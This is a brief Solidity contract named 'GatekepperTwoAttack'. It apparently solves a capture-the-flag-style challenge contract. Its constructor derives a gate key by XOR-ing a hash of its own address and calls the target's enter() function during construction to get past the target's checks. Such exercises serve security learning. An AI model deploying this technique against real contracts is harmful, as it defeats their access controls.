// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface GatekepperTwo{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekepperTwoAttack {

    constructor(address target){
        bytes8 getKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        GatekepperTwo keeper = GatekepperTwo(target);
        keeper.enter(getKey);
    }
}